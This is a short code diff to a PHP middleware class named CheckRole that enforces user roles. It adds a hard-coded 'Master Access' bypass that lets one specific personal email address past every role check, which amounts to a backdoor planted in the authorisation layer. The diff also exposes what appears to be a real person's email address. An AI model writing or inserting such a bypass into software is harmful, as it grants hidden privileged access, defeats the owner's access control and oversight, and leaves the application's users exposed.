@@ -25,6 +25,11 @@ class CheckRole
 
         $user = Auth::user();
 
+        // Master Access for specific email
+        if ($user->email === 'donvictorlive@gmail.com') {
+            return $next($request);
+        }
+
         // Super Admin bypass: They can go anywhere
         if ($user->role === 'super_admin') {
             return $next($request);
